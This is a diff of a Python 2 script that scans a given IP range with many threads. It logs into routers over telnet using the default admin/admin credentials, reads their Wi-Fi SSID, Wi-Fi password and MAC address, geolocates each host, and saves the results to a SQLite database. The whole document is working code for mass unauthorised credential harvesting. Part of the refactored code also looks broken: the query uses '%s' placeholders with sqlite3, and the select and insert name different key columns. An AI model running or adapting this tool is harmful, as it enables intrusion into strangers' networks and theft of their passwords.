@@ -29,13 +29,45 @@ def ip_range(start, end):
     return [num2ip(num) for num in range(ip2num(start), ip2num(end) + 1) if num & 0xff]
 
 
-def bThread(iplist):
+class Database:
+    db = sys.path[0] + "/TPLINKKEY.db"
+    charset = 'utf8'
+
+    def __init__(self):
+        self.connection = sqlite3.connect(self.db)
+        self.connection.text_factory = str
+        self.cursor = self.connection.cursor()
+
+    def insert(self, query, params):
+        try:
+            self.cursor.execute(query, params)
+            self.connection.commit()
+        except:
+            self.connection.rollback()
+
+    def update(self, query, params):
+        try:
+            self.cursor.execute(query, params)
+            self.connection.commit()
+        except:
+            self.connection.rollback()
+
+    def query(self, query, params):
+        cursor = self.connection.cursor()
+        cursor.execute(query, params)
+        return cursor.fetchall()
+
+    def __del__(self):
+        self.connection.close()
+
+
+def bThread(ip_list):
     threadl = []
     queue = Queue.Queue()
-    hosts = iplist
+    hosts = ip_list
     for host in hosts:
         queue.put(host)
-    for x in xrange(0, int(sys.argv[1])):
+    for x in xrange(0, SET_THREAD):
         threadl.append(tThread(queue))
     for t in threadl:
         try:
@@ -74,6 +106,8 @@ def getposition(host):
 
 
 def getinfo(host):
+    my_sqlite_db = Database()
+
     username = "admin"
     password = "admin"
     telnetTime = 15
@@ -89,47 +123,46 @@ def getinfo(host):
 
         t.write("wlctl show\n")
         t.read_until("SSID", cmdTime)
-        wifiStr = t.read_very_eager()
+        wifi_str = t.read_very_eager()
 
         t.write("lan show info\n")
         t.read_until("MACAddress", cmdTime)
-        lanStr = t.read_very_eager()
+        lan_str = t.read_very_eager()
 
         t.close()
 
-        if len(wifiStr) > 0:
-
+        if len(wifi_str) > 0:
             # clear extra space
-            wifiStr = "".join(wifiStr.split())
-            wifiStr = wifiStr.decode('utf-8').encode('utf-8')
+            wifi_str = "".join(wifi_str.split())
+            wifi_str = wifi_str.decode('utf-8').encode('utf-8')
             # get SID KEY MAC
-            ssid = wifiStr[1:wifiStr.find('QSS')]
-            key = wifiStr[wifiStr.find('Key=') + 4:wifiStr.find('cmd')] if wifiStr.find('Key=') != -1 else '无密码'
-            mac = lanStr[1:lanStr.find('__')].replace('\r\n', '')
+            wifi_ssid = wifi_str[1:wifi_str.find('QSS')]
+            wifi_key = wifi_str[wifi_str.find('Key=') + 4:wifi_str.find('cmd')] if wifi_str.find('Key=') != -1 else '无密码'
+            router_mac = lan_str[1:lan_str.find('__')].replace('\r\n', '')
 
             currentTime = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(time.time()))
 
             try:
-                cx = sqlite3.connect(sys.path[0] + "/TPLINKKEY.db")
-                cx.text_factory = str
-                cu = cx.cursor()
-                cu.execute("select * from scanlog where ssid='%s' and key='%s'" % (ssid, key))
-                if not cu.fetchone():
+                query_info = "select * from scanlog where ssid=%s and key=%s"
+                query_result = my_sqlite_db.query(query_info, [wifi_ssid, wifi_key])
+
+                if len(query_result) < 1:
+
                     posData = getposition(host)
                     country = unicode(posData[0])
                     province = unicode(posData[1])
                     city = unicode(posData[2])
                     isp = unicode(posData[3])
-                    cu.execute("INSERT INTO scanlog (host,mac,ssid,key,country,province,city,isp) VALUES (?,?,?,?,?,?,?,?)", (host, mac, ssid, key, country, province, city, isp))
-                    cx.commit()
-                    print '[√] [' + currentTime + '] Found ' + host + '  ' + ssid + '  ' + key + ' => Inserted!'
+
+                    insert_info = """INSERT INTO scanlog (`host`,`mac`,`ssid`,`wifikey`,`country`,`province`,`city`,`isp`) VALUES (?,?,?,?,?,?,?,?)"""
+
+                    my_sqlite_db.insert(insert_info, (host, router_mac, wifi_ssid, wifi_key, country, province, city, isp))
+                    print '[√] [%s] Info %s  %s  %s => Inserted!' % (currentTime, host, wifi_ssid, wifi_key)
                 else:
-                    print '[x] [' + currentTime + '] Found ' + host + '  ' + ssid + '  ' + key + ' <= Found in database!'
-                cu.close()
-                cx.close()
+                    print '[x] [%s] Found %s  %s  %s in DB, do nothing!' % (currentTime, host, wifi_ssid, wifi_key)
             except Exception, e:
                 print e
-    except Exception, e:
+    except:
         pass
 
 
@@ -139,16 +172,19 @@ if __name__ == '__main__':
     print '           Author 92ez.com'
     print '=========================================='
 
-    startIp = sys.argv[2].split('-')[0]
-    endIp = sys.argv[2].split('-')[1]
-    iplist = ip_range(startIp, endIp)
-    thispid = os.getpid()
+    global SET_THREAD
 
-    print '\n[*] Total ' + str(len(iplist)) + " IP..."
+    SET_THREAD = int(sys.argv[1])
+    begin_ip = sys.argv[2].split('-')[0]
+    end_ip = sys.argv[2].split('-')[1]
+    ip_list = ip_range(begin_ip, end_ip)
+    current_pid = os.getpid()
+
+    print '\n[*] Total ' + str(len(ip_list)) + " IP..."
     print '\n================ Running ================='
 
     try:
-        bThread(iplist)
+        bThread(ip_list)
     except KeyboardInterrupt:
         print '\n[*] Kill all thread.'
-        os.kill(thispid, 9)
+        os.kill(current_pid, 9)
